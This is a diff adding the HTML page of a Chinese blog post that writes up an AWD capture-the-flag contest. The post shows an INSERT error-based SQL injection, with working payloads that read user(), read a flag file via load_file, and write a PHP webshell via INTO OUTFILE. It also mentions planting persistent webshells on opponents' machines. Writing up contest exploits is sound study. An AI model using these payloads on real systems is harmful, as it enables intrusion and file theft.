@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSTS-AWD-XI&#39;AN">
+<meta property="og:url" content="http://altmanz.cn/2018/05/28/CSTS-AWD/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-05-28T14:47:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSTS-AWD-XI&#39;AN">
+<meta name="twitter:description" content="第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一">
+
+
+
+
+
+
+  <link rel="canonical" href="http://altmanz.cn/2018/05/28/CSTS-AWD/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CSTS-AWD-XI'AN | Altm4nz</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Altm4nz</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/05/28/CSTS-AWD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Altm4nz">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Altm4nz">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSTS-AWD-XI'AN
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-05-28 21:29:17 / Modified: 22:47:26" itemprop="dateCreated datePublished" datetime="2018-05-28T21:29:17+08:00">2018-05-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。<br>有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。<br>源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会<br>，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一次分，但是进攻太多，很多队伍都补上了洞，导致刚开始只拿到了14台机器的shell。上传了.index.php的不死马，这14台机器的shell都很稳定一直在得分。<br>写出脚本定时的拿flag交flag后开始继续审计。下次还是要分工明确，队友补洞，我拿到shell后直接批量种马。【进攻拿分才是最重要的啊】</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>主办方留了差不多一大堆后门，放在D盾里扫出了一部分，然后定位一些危险函数找到一些，没什么好说的。<br>主要说比赛结束前10分钟审出来了一个insert报错注入的洞。<br>在service1的sql中，贴上关键代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO staff VALUES('$idis','$username','$mail','$workname','$phoneis')"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>这里面5个参数只有$workname没有做任何过滤，所以从这里入手。<br>抓包后随便尝试下 workname=1’) 直接给了报错，尝试报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workname=1&apos;,&apos;&apos;) and (updatexml(1,concat(0x7e,(select user()),0x7e),1));%23</span><br></pre></td></tr></table></figure></p>
+<p>成功返回user()<br>这里可以直接读取文件，也能导出shell，时间原因我只尝试了读flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workname=1&apos;,&apos;&apos;) and (updatexml(1,concat(0x7e,(select load_file(&apos;/home/flag&apos;)),0x7e),1));%23</span><br></pre></td></tr></table></figure></p>
+<p>成功读取，因为比赛马上结束，没有批量打，算是很可惜了。<br>getshell的话可以直接用INTO OUTFILE导出木马在web目录里。<br>可以先workname字段中存入一句话木马，然后利用payload导出php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workname=1&apos;,&apos;&apos;) and select workname from stall where idis=999 into out file &apos;/var/www/html/sql/altman.php&apos;;%23</span><br></pre></td></tr></table></figure></p>
+<p>其他应该还有一个利用cache写文件的洞，全场没人利用，我也没有找到具体的利用方法，等之后想出来了再补充吧</p>
+<p>再吐槽一下这比赛的check，居然是用nmap扫描服务，那我直接删目录岂不是无敌了？最后有好几个队伍，明明网站全部404，还没被扣分，这怎么玩，导致我控的服务器减少了一半。。。<br>我佛了</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/13/网络空间安全技术大赛/" rel="next" title="网络空间安全技术大赛">
+                <i class="fa fa-chevron-left"></i> 网络空间安全技术大赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/30/SUCTF-WEB/" rel="prev" title="SUCTF-WEB">
+                SUCTF-WEB <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Altm4nz</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞"><span class="nav-number">1.</span> <span class="nav-text">漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Altm4nz</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
